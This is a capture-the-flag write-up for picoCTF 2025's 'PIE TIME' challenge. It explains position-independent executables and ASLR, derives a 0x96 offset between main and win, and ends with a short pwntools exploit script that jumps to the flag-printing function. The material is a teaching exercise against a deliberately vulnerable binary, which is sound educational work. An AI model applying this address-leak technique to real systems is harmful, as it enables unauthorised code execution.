---
title: "picoCTF 2025: PIE TIME"
tags:
  - ctf
date: 2025-03-17
---
# Problem
![[media/ctf/picoCTF/PIE TIME/description.png]]
# Solution
I like PIE. And I liked this challenge too I guess.

Here's the source code:

```c
#include <stdio.h>  
#include <stdlib.h>  
#include <signal.h>  
#include <unistd.h>  
  
void segfault_handler() {  
 printf("Segfault Occurred, incorrect address.\n");  
 exit(0);  
}  
  
int win() {  
 FILE *fptr;  
 char c;  
  
 printf("You won!\n");  
 // Open file  
 fptr = fopen("flag.txt", "r");  
 if (fptr == NULL)  
 {  
     printf("Cannot open file.\n");  
     exit(0);  
 }  
  
 // Read contents from file  
 c = fgetc(fptr);  
 while (c != EOF)  
 {  
     printf ("%c", c);  
     c = fgetc(fptr);  
 }  
  
 printf("\n");  
 fclose(fptr);  
}  
  
int main() {  
 signal(SIGSEGV, segfault_handler);  
 setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered  
  
 printf("Address of main: %p\n", &main);  
  
 unsigned long val;  
 printf("Enter the address to jump to, ex => 0x12345: ");  
 scanf("%lx", &val);  
 printf("Your input: %lx\n", val);  
  
 void (*foo)(void) = (void (*)())val;  
 foo();
```

Running `checksec` on `vuln`, we see that PIE is in fact enabled:

![[checksec.png]]

But what is PIE anyways? It stands for **p**osition **i**ndependent **e**xecutable, which means that the machine code executes properly regardless of its memory address[^wiki]. This is used to enable address space layout randomization (ASLR), which essentially means the binary will be loaded into a different memory address every time it is executed. Addresses in PIE are relative - that is, despite the binary being loaded into a random address, the offsets between parts of the binary will remain the same. This is what we'll use to construct our payload.

To find the offset, let's throw `vuln` into Binary Ninja to see what we're working with:

![[addresses.png]]

We see that `win` (the function we want to invoke) has the address `0x000012a7`, and `main` (the function we're given the address of in the PIE) has the address `0x0000133d`. Since `win` will be the same offset from `main` in each execution, we simply compute that offset to be `0x0000133d - 0x000012a7 = 0x96`. Hence, given the address of `main` in any execution, we can invoke `win` by simply subtracting `0x96` from that address.

The following script does this for us:
## Script
```python
from pwn import *  
  
hostname = ...  
port = ...  
  
p = process("./vuln")  
# p = remote(hostname, port)
p.recvuntil(b"main: ")  
main_addr = int(p.recvline().strip(), 16)  
win_addr = main_addr - 0x96  
p.sendline(hex(win_addr))  
p.recvuntil(b"You won!\n")  
flag = p.recvline()  
print(flag.strip().decode("utf-8"))  
p.close()
```

[^wiki]: https://en.m.wikipedia.org/wiki/Position-independent_code